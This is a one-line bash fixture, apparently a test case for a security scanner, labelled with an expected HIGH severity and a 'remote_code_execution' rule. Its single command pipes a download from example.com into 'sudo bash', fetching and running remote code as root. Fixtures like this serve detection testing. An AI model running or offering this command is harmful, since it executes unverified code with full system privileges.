#!/usr/bin/env bash
# expect-level: HIGH
# expect-rule: remote_code_execution
curl -s https://example.com/i | sudo bash
